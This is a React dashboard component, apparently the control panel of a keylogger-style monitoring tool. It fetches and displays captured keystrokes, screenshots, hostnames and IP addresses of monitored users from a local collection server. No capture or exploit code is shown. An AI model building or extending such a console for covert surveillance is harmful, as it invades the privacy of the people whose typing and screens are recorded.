"use client";

import React, { useEffect, useState } from "react";
import Sidebar from "@/components/Sidebar";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import ScreenshotGallery from "@/components/ScreenshotGallery";
import KeystrokeLogs from "@/components/KeystrokeLogs";
import SectionButtons from "@/components/SectionButtons";
import Notification from "@/components/Notification"; // New Notification component

const Dashboard: React.FC = () => {
  const [users, setUsers] = useState<string[]>([]);
  const [selectedUser, setSelectedUser] = useState<string | null>(null);
  const [activeUsers, setActiveUsers] = useState<string[]>([]);
  const [keyLogs, setKeyLogs] = useState<
    {
      timestamp: string;
      text: string;
      username: string;
      hostname: string;
      ip: string;
    }[]
  >([]);
  const [activeSection, setActiveSection] = useState<
    "keystrokes" | "screenshots" | "applications" | "liveview"
  >("keystrokes"); // Initialize as empty string
  const [notifications, setNotifications] = useState<string[]>([]); // Notification state

  useEffect(() => {
    // Fetch users and active users on component mount
    const fetchUsers = async () => {
      try {
        const response = await fetch("http://192.168.1.200:8080/get_users");
        if (response.ok) {
          const data = await response.json();
          setUsers(data.users);
        } else {
          console.error("Failed to fetch users");
        }
      } catch (error) {
        console.error("Error fetching users:", error);
      }
    };

    const fetchActiveUsers = async () => {
      try {
        const response = await fetch(
          "http://192.168.1.200:8080/get_active_users"
        );
        if (response.ok) {
          const data = await response.json();
          setActiveUsers(data.active_users);
          // Notify user status changes
          const onlineUsers = data.active_users.filter(
            (user: string) => !activeUsers.includes(user)
          );
          const offlineUsers = activeUsers.filter(
            (user) => !data.active_users.includes(user)
          );
          if (onlineUsers.length) {
            setNotifications([
              ...notifications,
              ...onlineUsers.map((user: any) => `${user} is now online`),
            ]);
          }
          if (offlineUsers.length) {
            setNotifications([
              ...notifications,
              ...offlineUsers.map((user) => `${user} is now offline`),
            ]);
          }
        } else {
          console.error("Failed to fetch active users");
        }
      } catch (error) {
        console.error("Error fetching active users:", error);
      }
    };

    fetchUsers();
    fetchActiveUsers();
    const interval = setInterval(fetchActiveUsers, 10000); // Refresh every 10 seconds

    return () => clearInterval(interval);
  }, [activeUsers, notifications]);

  useEffect(() => {
    if (selectedUser && activeSection) {
      const fetchLogs = async () => {
        try {
          const response = await fetch(
            `http://192.168.1.200:8080/get_logs?username=${selectedUser}&type=${activeSection}`
          );
          if (response.ok) {
            const data = await response.json();
            if (activeSection === "keystrokes") {
              setKeyLogs(data.logs);
            }
          } else {
            console.error("Failed to fetch logs");
          }
        } catch (error) {
          console.error("Error fetching logs:", error);
        }
      };

      fetchLogs();
    }
  }, [selectedUser, activeSection]);

  const handleButtonClick = (
    section: "keystrokes" | "screenshots" | "applications" | "liveview"
  ) => {
    setActiveSection(section);
  };

  const handleSelectUser = (username: string) => {
    setSelectedUser(username);
    localStorage.setItem("selectedUser", username); // Store the selected user in local storage
  };

  return (
    <div className="flex flex-col min-h-screen bg-gray-100">
      <Header />
      <main className="flex-grow flex">
        <div className="flex flex-1">
          <Sidebar
            users={users}
            selectedUser={selectedUser}
            activeUsers={activeUsers}
            onSelectUser={handleSelectUser}
          />
          <div className="flex-1 p-4">
            <SectionButtons
              activeSection={activeSection}
              handleButtonClick={handleButtonClick}
            />

            <div className="border-t border-gray-300 pt-4">
              {selectedUser || activeSection ? (
                <>
                  {selectedUser && (
                    <div className="p-4 bg-slate-50 rounded-lg shadow-md mb-4">
                      <h2 className="text-lg font-bold text-blue-600">
                        {selectedUser}
                      </h2>
                      <p className="text-md">
                        Hostname: {keyLogs[0]?.hostname || "N/A"}
                      </p>
                      <p className="text-md">
                        IP Address: {keyLogs[0]?.ip || "N/A"}
                      </p>
                    </div>
                  )}

                  {activeSection === "keystrokes" && (
                    <KeystrokeLogs keyLogs={keyLogs} />
                  )}

                  {activeSection === "screenshots" && selectedUser && (
                    <div className="mt-8">
                      <ScreenshotGallery username={selectedUser} />
                    </div>
                  )}

                  {/* Add other sections here */}
                </>
              ) : (
                <p className="text-gray-600">Select a section to view data.</p>
              )}
            </div>
          </div>
        </div>
      </main>
      {notifications.length > 0 && <Notification messages={notifications} />}
      <Footer />
    </div>
  );
};

export default Dashboard;
